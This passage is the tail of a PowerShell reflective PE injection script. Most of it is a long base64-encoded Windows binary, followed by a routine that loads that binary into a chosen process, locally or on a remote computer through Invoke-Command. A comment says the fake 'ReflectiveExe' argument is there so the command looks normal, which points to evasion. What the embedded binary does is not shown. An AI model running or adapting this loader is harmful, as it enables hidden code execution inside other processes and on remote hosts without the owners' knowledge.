AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAGFiY2RlZmdoaWprbG1ub3BxcnN0dXZ3eHl6AAAAAAAAQUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVoAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEDlARDCOAEQ/v///y4AAAAuAAAAAAAAAGznARCI8QEQiPEBEIjxARCI8QEQiPEBEIjxARCI8QEQiPEBEIjxARB/f39/f39/f3DnARCM8QEQjPEBEIzxARCM8QEQjPEBEIzxARCM8QEQAAAAAAAAAAD+////AAAAAAAAAAAAAAAAdZgAAAAAAAAAAAAAAAAAAAAiARAAAAAALj9BVmJhZF9hbGxvY0BzdGRAQAAAIgEQAAAAAC4/QVZleGNlcHRpb25Ac3RkQEAAACIBEAAAAAAuP0FWYmFkX2FycmF5X25ld19sZW5ndGhAc3RkQEAAAAAiARAAAAAALj9BVnR5cGVfaW5mb0BAAAAiARAAAAAALj9BVl9jb21fZXJyb3JAQAAAAAAAIgEQAAAAAC4/QVZiYWRfZXhjZXB0aW9uQHN0ZEBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAJJwAAB3cAAATHUAADJ1AABPdQAATHUAAJ11AABMdQAAqKkAAEx1AAAnrgAAOYsAAOOKAACelgAAcpYAAJR1AAAdrgAADK4AAIakAAAupAAATHUAAEx1AADVhgAAKIYAAFd1AAAgdQAAF1UAAO9VAAAolAAA3KMAALDpAACMsgAAGfIAAJz3AAA2AAAASQAAAEwAAABOAAAAUAAAAE4AAABXAAAATgAAAF0AAABUAAAAVQAAAEwAAABaAAAAWwAAABMAAAAKAAAACgAAAAABAAAIAQAABQEAAAYBAAANAAAAZAAAAFEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABABgAAAAYAACAAAAAAAAAAAAAAAAAAAABAAIAAAAwAACAAAAAAAAAAAAAAAAAAAABAAkEAABIAAAAYBACAH0BAAAAAAAAAAAAAAAAAAAAAAAAPD94bWwgdmVyc2lvbj0nMS4wJyBlbmNvZGluZz0nVVRGLTgnIHN0YW5kYWxvbmU9J3llcyc/Pg0KPGFzc2VtYmx5IHhtbG5zPSd1cm46c2NoZW1hcy1taWNyb3NvZnQtY29tOmFzbS52MScgbWFuaWZlc3RWZXJzaW9uPScxLjAnPg0KICA8dHJ1c3RJbmZvIHhtbG5zPSJ1cm46c2NoZW1hcy1taWNyb3NvZnQtY29tOmFzbS52MyI+DQogICAgPHNlY3VyaXR5Pg0KICAgICAgPHJlcXVlc3RlZFByaXZpbGVnZXM+DQogICAgICAgIDxyZXF1ZXN0ZWRFeGVjdXRpb25MZXZlbCBsZXZlbD0nYXNJbnZva2VyJyB1aUFjY2Vzcz0nZmFsc2UnIC8+DQogICAgICA8L3JlcXVlc3RlZFByaXZpbGVnZXM+DQogICAgPC9zZWN1cml0eT4NCiAgPC90cnVzdEluZm8+DQo8L2Fzc2VtYmx5Pg0KAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEAAAuAAAACQwsTDqMN4x7TFhMncyjjKWMqEyqDK7MskyCTM2MzszUjNbM2UzkzMgNI80oDTKNM802zQHNRM1JzmiObg54znvOQc6FToeOjI6NzpDOlc6aDqBOo46mTqeOq467Dr2Ov86DzsUOxk7HjsqO0A7fzuyO8M73zv3OwE8QTxcPGI8mTy9PNQ84TzrPAE9Dj0hPS49az2fPco9+D0HPiU+Lj40PkY+eD6oPrI+TD9TPwAAACAAACQBAAAAMC8wPzBWMGcweDB9MJYwmzCoMPUwEjEcMSoxPDFRMY8xaDKbMuky8jL9MgQzJDMqMzAzNjM8M0IzSTNQM1czXjNlM2wzczN7M4MzizOXM6AzpTOrM7UzvzPPM98z7zP4Mx40ODQ+NFc0cTR3NIc0rTTENPU0EjUoNYU1NTZmNrU2yDbbNuc29zYINy43QzdKN1A3YjdsN8032jcBOAk4IjhcOHc4gziSOJs4qDjXON846jjwOPY4AjklOVY5ATogOio6OzpHOlA6VTp7OoA6pTqxOs46FzszO0E7XDtnO/Y7/zsHPE48XTxkPJo8ozywPLs8xDzTPOo8Bj0LPRo9fD2LPRU+MD5JPqs+6D4BPxs/Mz9mP24/gj8AAAAwAABIAAAAJzBBMEcwTzALMjg2jjYxOIo4HDlvOZM69DwLPSY9ST1ZPXE9nD3CPeU99T0NPjg+Wj5oPtg+WT9hP3M/xD/sPwBAAACUAAAArDD9ML4xFTIoMqAyQTNhM6szwzPIMzM0NjVHNWQ3dzeVN6M3UTmIOY85lDmYOZw5oDn2OTs6QDpEOkg6TDqvPMQ83jwGPRQ9Gj0vPUs9XT1oPX09hz2VPbA9wT0gPjM+Rz5TPo8+nz62Pr4+6D4EPxM/Hz8tP08/Xz9kP2k/nz+kP6k/4j/nP+w/AAAAUAAAsAAAABwwITAmMGUwajBvMJYwnzCkMKkwzTDZMN4w4zAHMRMxGDEdMUQxUDFVMVoxijGSMZ0xqjHAMdIx3jEFMhEyKDNRM20zjTObM6IzqDO6M8wz0TPsM1E0XTTVNO80+DQYNTI1QTVPNVs1ZzV1NYU1mjWxNdQ16TX/NQw2GjYoNjM2STZdNmY28Dn5OQE6nzq+O9A7CT2VPZk9nT2hPaU9qT2tPbE92j8AAABgAAB8AAAAajKGMooyjjKSMpYymjKeMqIypjKqMq4ysjIEM1k3dTekObY50jn2ORE6HDpYOow6szrNOh47UjxoPJ88zzzePPQ8Cj0hPSg9ND1HPUw9WD1dPW492D3fPfE9+j1CPlQ+XD5mPm8+gD6SPq0+2T7gPhM/GD8AcAAAgAAAAD4wVjCDMJ4w3zDkMO4w8zD+MAkxHTFuMRIyJTI0MlUyrjK5MggzIDNqMwA0FzSVNNk06zQhNSY1MzU/NVg1azWeNa01sjXDNck11DXcNec17TX4Nf41DDYVNho2OjY/NmA2fTYFNws3HTdbN2E3jjf7NwE44z8AAACAAADkAAAA0TDbMOgwGzEtMV0xejGFMdcx3jHxMSEyVDJnMn4yhjLCMtIy6TLxMhgzMTNAM0wzWjN8M44zmTOeM6MzvjPIM+Qz7zP0M/kzFDQeNDo0RTRKNE80ajR0NJA0mzSgNKU0wzTNNOk09DT5NP40HzUvNUs1VjVbNWA1kzW3NdM13jXjNeg1BjYpNjQ2QTZWNmE2dTZ6Nn82oTavNr424jb0NgA3DjcvNzY3TDdiN283dDeCN2Q4gziIOIU5vjnuOQk6RDp7Oo06wzrmOkA7UDujO707UT1YPo4+qz/HPwCQAABgAAAAGzDOMR4yTzJ/MsoyxjPaM1Y0DzUWNT41WDVvNXY1qzW8Ndc14zX0Nf01MjZDNl02ZjZzNn02nzawNsU2zzbyNvw27zu6Pvk+AD8QPx8/Jj8+P0U/Yz8AAACgAADEAAAAYjGSMcQxEzLQMtsyFzMpMy8z1DPfM+kz7zMDNA80MzRMNHk0gDSLNJk0oDSmNME0yDTRNEs1WjVsNX41mjW4NcI10zXYNe01IDYnNi42NTZPNl42aDZ1Nn82jzbnNh83OjdMOXk5mjmfOao5vjnJOeA5EDolOjM6PDpxOqg63jrxOoM7tzveOyk8HD0/PWU9hz0OPhU+Hz4pPi4+ND45Pkc+az6fPso+7D4TPzE/PD+5P8A/xz/OP9s/AAAAsAAAmAAAABwwKTA2MEMwWjAhMZ4xpzG/MdEx/jEsMmAyaDKBMpMynzKnMr8y1jIoM0ozaTNkNOM0EDWTNRM2RjZbNmw28jYIN0g3ZDeDN7M3PzheOJc4vjjJONk4UDmHOaY5vDnGOeU5AzpyOps6xDriOmA7iTuyO847VzyFPLY80jwFPSI9RD3DPR8+vz4uPzg/hj8AAADAAABMAAAAXjB4MLgwxzDVMPIw+jAjMSoxRjFNMWQxejG1MbwxDDIgMo8y4zJpM2M0VjWjNXs25DYONz03ozfcN/I3EziLOEo+tj4A0AAAHAAAAIk2kTbINs82+TnuOvY6LTs0Ozk+AOAAAIAAAAB9MYQxizGSMX40hTRQNVc11jXqNSI2NDZGNlg2ajZ8No42oDayNsQ21jboNvo2GzctNz83UTdjN5w44jhrOX055jnsOUs6UTpeOpE6LztFO5873DvmOwE8XjyRPLE82zybPaU9zz0bPio+ST5aPjI/cj/dP/c/AAAA8AAAjAAAAAQwNDBYMGMwcDCCMMow4zBnMXwxhTGOMaQxCTIPMhQyGjIrMug0LTUJNok2zTakN+k38Tf5NwE4CTgnOC84kTidOLE4vTjJOOk4MDlaOWI5fzmPOZs5qjmuOt86ITtYO3U7iTuUO+E7aTzQPIU9+T0WPiY+ez58P4w/nT+lP7U/xj8AAAAAAQBcAAAALDA3MEIwSDBRMJMwvjDjMO8w+zAOMS0xWDFwMbUxwTHNMdkx7DEQMpAysjPEM9YzRjSnNAI1cDWPNcA1FTdPOGo4gDiWOJ449zv6PAs9kj+YP54/ABABAFQAAAAaME4whTAGMQsxHTE7MU8xVTGhMr4ykjSuNIQ1lzW1NcM1cTeoN683tDe4N7w3wDcWOFs4YDhkOGg4bDjWOhI8Xz25PQY+IT4xPjc+ACABAGgBAABQMVgxZDFoMWwxeDF8MYAxlDGYMZwxoDGkMbwxwDHEMdgx3DHgMfwxADIEMggyDDIQMhQyKDJ0MngyfDKAMvAz9DP4M/wzADQENAg0DDQQNBQ0GDQcNCA0JDQoNCw0MDQ0NDg0PDRANEQ0SDRMNFA0VDRYNFw0YDRkNGg0bDRwNHQ0eDR8NIA0hDSINIw0kDSUNJg0nDSgNKQ0qDSsNLA0tDS4NLw0wDTENMg0zDTQNNQ02DTcNOA05DToNOw08DT0NPg0/DQANQQ1CDUMNRA1FDUYNRw1IDUkNSg1LDUwNTQ1ODU8NUA1RDVINUw1UDVUNVg1XDVgNWQ1aDVsNXA1dDV4NXw1eDyAPIg8jDyQPJQ8mDycPKA8pDysPLA8tDy4PLw8wDzEPMg81DzcPOA85DzoPOw8WD5cPmA+ZD5oPmw+cD50Png+fD6APoQ+iD6MPpA+lD6YPpw+oD6kPgAAADABAMAAAAAYNxw3IDckNyg3LDcwNzQ3ODc8N0A3RDdIN0w3UDdUN1g3XDdgN2Q3aDdsN3A3dDd4N3w3gDeEN4g3jDeQN5Q3mDecN6A3pDeoN6w3sDe0N7g3vDfAN8w30DfUN9g33DfgN+Q36DfsN/A39Df4N/w3ADgEOAg4DDgQOBQ4GDgcOCA4JDgoOCw4MDg0ODg4PDhAOEQ4SDhMOFA4VDhYOFw4YDhkOGg4bDhwOHQ4eDh8OIA4hDiIOAAAAEABANABAADMMNQw3DDkMOww9DD8MAQxDDEUMRwxJDEsMTQxPDFEMUwxVDFcMWQxbDF0MXwxhDGMMZQxnDGkMawxtDG8McQxzDHUMdwx5DHsMfQx/DEEMgwyFDIcMiQyLDI0MjwyRDJMMlQyXDJkMmwydDJ8MoQyjDKUMpwypDKsMrQyvDLEMswy1DLcMuQy7DL0MvwyBDMMMxQzHDMkMywzNDM8M0QzTDNUM1wzZDNsM3QzfDOEM4wzlDOcM6QzrDO0M7wzxDPMM9Qz3DPkM+wz9DP8MwQ0DDQUNBw0JDQsNDQ0PDRENEw0VDRcNGQ0bDR0NHw0hDSMNJQ0nDSkNKw0tDS8NMQ0zDTUNNw05DTsNPQ0/DQENQw1FDUcNSQ1LDU0NTw1RDVMNVQ1XDVkNWw1dDV8NYQ1jDWUNZw1pDWsNbQ1vDXENcw11DXcNeQ17DX0Nfw1BDYMNhQ2HDYkNiw2NDY8NkQ2TDZUNlw2ZDZsNnQ2fDaENow2lDacNqQ2rDa0Nrw2xDbMNtQ23DbkNuw29Db8NgQ3DDcUNxw3JDcsNzQ3PDdEN0w3VDdcN2Q3bDd0N3w3hDeMN5Q3nDekN6w3tDe8N8Q3zDfUN9w35DcAUAEA0AEAAPAx+DEAMggyEDIYMiAyKDIwMjgyQDJIMlAyWDJgMmgycDJ4MoAyiDKQMpgyoDKoMrAyuDLAMsgy0DLYMuAy6DLwMvgyADMIMxAzGDMgMygzMDM4M0AzSDNQM1gzYDNoM3AzeDOAM4gzkDOYM6AzqDOwM7gzwDPIM9Az2DPgM+gz8DP4MwA0CDQQNBg0IDQoNDA0ODRANEg0UDRYNGA0aDRwNHg0gDSINJA0mDSgNKg0sDS4NMA0yDTQNNg04DToNPA0+DQANQg1EDUYNSA1KDUwNTg1QDVINVA1WDVgNWg1cDV4NYA1iDWQNZg1oDWoNbA1uDXANcg10DXYNeA16DXwNfg1ADYINhA2GDYgNig2MDY4NkA2SDZQNlg2YDZoNnA2eDaANog2kDaYNqA2qDawNrg2wDbINtA22DbgNug28Db4NgA3CDcQNxg3IDcoNzA3ODdAN0g3UDdYN2A3aDdwN3g3gDeIN5A3mDegN6g3sDe4N8A3yDfQN9g34DfoN/A3+DcAOAg4EDgYOCA4KDgwODg4QDhIOFA4WDhgOGg4cDh4OIA4iDiQOJg4oDioOLA4uDjAOMg40DjYOOA46DjwOPg4ADkIOQBgAQAQAAAA6jzuPPI89jwAcAEARAAAAIw2lDacNqQ2rDa0Nrw2xDbMNtQ23DbkNuw29Db8NgQ3DDcUNxw3JDcsNzQ3PDdEN0w3VDdcN2Q3bDcAAACwAQAoAAAAZD9oP3A/kD+UP6Q/qD+wP8g/2D/cP+w/8D/0P/w/AAAAwAEA9AAAABQwJDAoMDgwPDBAMEQwTDBkMHQweDCIMIwwlDCsMLwwwDDQMNQw2DDgMPgwXDVoNYw1rDW0Nbw1xDXMNdQ14DUANgg2EDYYNiA2QDZgNnw2gDaINpA2mDacNqQ2uDbANtQ23DbkNuw28Db0Nvw2EDcsNzA3TDdQN1g3YDdoN3A3hDegN6g3rDfIN9A31DfsN/A3DDgQOCA4RDhQOFg4hDiIOJA4mDigOKQ4rDjAOOA4ADkgOSg5LDlIOWg5hDmIOag5yDnUOfA5EDowOlA6cDqQOrA60DrwOhA7MDtQO3A7kDuwO9A78DsMPBA8AOABAFwAAAAUMCwwYDCAMbAxwDHQMeAx8DEIMhQyGDIcMjgyPDJgN2Q3eDd8N4A3hDeIN4w3kDeUN5g3nDeoN6w3sDe0N7g3vDfAN8Q38DcMOCg4UDhoOIQ4AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA='

    #Add a "program name" to exeargs, just so the string looks as normal as possible (real args start indexing at 1)
    if ($ExeArgs -ne $null -and $ExeArgs -ne '')
    {
        $ExeArgs = "ReflectiveExe $ExeArgs"
    }
    else
    {
        $ExeArgs = "ReflectiveExe"
    }
    
    [System.IO.Directory]::SetCurrentDirectory($pwd)

    if ($ComputerName -eq $null -or $ComputerName -imatch "^\s*$")
    {
        Invoke-Command -ScriptBlock $RemoteScriptBlock -ArgumentList @($PEBytes64, $PEBytes32, $FuncReturnType, $ProcId, $ProcName,$ForceASLR, $PoshCode)
    }
    else
    {
        Invoke-Command -ScriptBlock $RemoteScriptBlock -ArgumentList @($PEBytes64, $PEBytes32, $FuncReturnType, $ProcId, $ProcName,$ForceASLR, $PoshCode) -ComputerName $ComputerName
    }
}

Main
}
